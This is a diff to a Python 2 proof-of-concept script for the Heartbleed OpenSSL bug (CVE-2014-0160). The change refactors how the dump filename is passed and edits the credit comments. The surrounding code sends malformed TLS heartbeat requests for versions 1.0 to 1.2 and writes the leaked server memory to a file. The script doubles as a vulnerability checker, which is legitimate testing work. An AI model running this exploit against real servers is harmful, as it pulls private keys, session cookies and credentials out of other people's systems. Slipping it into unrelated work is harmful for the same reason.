@@ -1,8 +1,8 @@
 #!/usr/bin/python
 
-# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
+# Quick and dirty demonstration of CVE-2014-0160 originally by Jared Stafford (jspenguin@jspenguin.org)
 # The author disclaims copyright to this source code.
-# http://s3.jspenguin.org/ssltest.py
+# Modified by others
 
 import sys
 import struct
@@ -17,8 +17,6 @@ options.add_option('-p', '--port', type='int', default=443, help='TCP port to te
 options.add_option('-n', '--num', type='int', default=1, help='Number of heartbeats to send if vulnerable (defines how much memory you get back) (default: 1)')
 options.add_option('-f', '--file', type='str', default='dump.bin', help='Filename to write dumped memory too (default: dump.bin)')
 options.add_option('-v', '--ver', type='int', default=2, help='TLS version 1 is 1.0, 2 is 1.1, 3 is 1.2, 0 will try all (default: 0)')
-
-dumpf = 'dump.bin'
 
 def h2bin(x):
 	return x.replace(' ', '').replace('\n', '').decode('hex')
@@ -56,7 +54,7 @@ hbv12 = h2bin('''
 01 40 00
 ''')
 
-def hexdump(s):
+def hexdump(s, dumpf):
 	dump = open(dumpf,'a')
 	dump.write(s)
 	dump.close()
@@ -99,8 +97,7 @@ def recvmsg(s):
 	print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
 	return typ, ver, pay
 
-def hit_hb(s):
-	#s.send(hb)
+def hit_hb(s, dumpf):
 	while True:
 		typ, ver, pay = recvmsg(s)
 		if typ is None:
@@ -109,7 +106,7 @@ def hit_hb(s):
 
 		if typ == 24:
 			print 'Received heartbeat response:'
-			hexdump(pay)
+			hexdump(pay, dumpf)
 			if len(pay) > 3:
 				print 'WARNING: server returned more data than it should - server is vulnerable!'
 			else:
@@ -118,7 +115,7 @@ def hit_hb(s):
 
 		if typ == 21:
 			print 'Received alert:'
-			hexdump(pay)
+			hexdump(pay, dumpf)
 			print 'Server returned error, likely not vulnerable'
 			return False
 
@@ -144,7 +141,7 @@ def parseresp(s):
 		if typ == 22 and ord(pay[0]) == 0x0E:
 			return True
 
-def check(host, port, version):
+def check(host, port, version, dumpf):
 	response = False
 	s = connect(host, port)	
 	if not parseresp(s):
@@ -153,13 +150,13 @@ def check(host, port, version):
 	sys.stdout.flush()
 	if (version == 1):
 		s.send(hbv10)
-		response = hit_hb(s)
+		response = hit_hb(s,dumpf)
 	if (version == 2):
 		s.send(hbv11)
-		response = hit_hb(s)
+		response = hit_hb(s,dumpf)
 	if (version == 3):
 		s.send(hbv12)
-		response = hit_hb(s)
+		response = hit_hb(s,dumpf)
 	s.close()
 	return response
 	
@@ -169,16 +166,15 @@ def main():
 		options.print_help()
 		return
 
-	dumpf = opts.file
 	for i in xrange(0,opts.num):
-		check(args[0], opts.port, opts.ver)	
+		check(args[0], opts.port, opts.ver, opts.file)	
 		if (opts.ver == 0):
 			one = 0
 			two = 0
 			three = 0
-			one = check(args[0], opts.port, 1)
-			two = check(args[0], opts.port, 2)
-			three = check(args[0], opts.port, 3)
+			one = check(args[0], opts.port, 1, opts.file)
+			two = check(args[0], opts.port, 2, opts.file)
+			three = check(args[0], opts.port, 3, opts.file)
 			if one: print 'TLS v1.0 is Vulnerable'
 			if two: print 'TLS v1.1 is Vulnerable'
 			if three: print 'TLS v1.2 is Vulnerable'
